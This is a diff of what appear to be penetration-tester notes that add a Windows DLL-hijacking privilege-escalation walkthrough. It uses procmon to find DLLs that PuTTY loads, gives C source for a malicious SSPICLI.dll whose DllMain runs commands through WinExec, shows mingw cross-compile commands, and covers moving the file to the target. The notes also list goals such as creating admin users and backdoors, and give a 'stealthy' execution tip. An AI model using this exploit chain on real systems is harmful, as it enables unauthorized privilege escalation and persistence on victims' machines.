@@ -135,25 +135,86 @@ SERVICES METHOD (binary replacement)
 
 ```
 
-# USING PROCMON TO FIND DLL's
+# DLL PRIVESC IN WINDOWS
 
 ```
-1. first make sure you have sysinternals tools:
+FINDING THE DLL's WITH PROCMON
+--------------------------------
+	1. first make sure you have sysinternals tools:
 
-	net use * \\live.sysinternals.com\tools
+		net use * \\live.sysinternals.com\tools
 
-2. next use procmon and accept the eula
+	2. next use procmon and accept the eula
+
+		.\procmon.exe --accepteula
+
+
+	3. use the following filters:
+
+		a) process name - contains - putty - include
+		b) result - contains - NOT include
+		c) path - contains - .dll - include
+
+	4. then run putty, your procmon filters should populate with output now
+
+
+[putty vulnerability](https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-indirect-dll-hijack-2.html)
+
+
+PART TWO: Create C source File and compile into DLL
+-----------------------------------------------------
+
+1. Install tools on linux machine
 	
-	.\procmon.exe --accepteula
+	 sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y
+
+2. THE actual C source code: (located also on linops at /security/scripts/sspicli.c)
+
+	########## SSPICLI.c ########## 
+	#include <windows.h>
+	int execCommand()
+	{
+	 WinExec("cmd /C whoami > FINDME_1.txt", 1);					#change 1 to 0 if you want to be stealthy: 1 specifies to pop up on the desktop when it opens
+	 return 0;									#if you want to run different commands from here, jhust change what the WinExec line does. make sure you escape special characters with backslashes!
+	}
+	BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+	{
+	 execCommand();
+	 return 0;
+	}
+	########## SSPICLI.c ##########
 
 
-3. use the following filters:
+		- ways we can escalate our privileges?
+			1. Created user, added that user to both remote desktop users and administrators
+			2. add existing users to privilege groups
+			3. establish persistence by creating backdoors
+			
+3. Compule the raw C source code into an unlined C object 
 
-	a) process name - contains - putty - include
-	b) result - contains - NOT include
-	c) path - contains - .dll - include
+	i686-w64-mingw32-g++ -c SSPICLI.c -o SSPICLI.o
 
-4. then run putty, your procmon filters should populate with output now
+4. Create the DLL from unlinked C object 
+
+	i686-w64-mingw32-g++ -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a
+
+5. Ensure we have the SSPICLI.dll
+
+	ls SSPICLI*
+	
+		#should return the SSPICLI.c, SSPICLI.dll, SSPICLI.o, and SSPICLI.a
+
+
+6. Transfer file to location 
+	
+	- python HTTP server
+		linops > python3 -m http.server
+		winops > navigate to your linops_ip:8000 in your browser then hit enter to open up the http server and directly download the files
+	- SCP
+	- Base64
+	
+
+
 
 ```
 
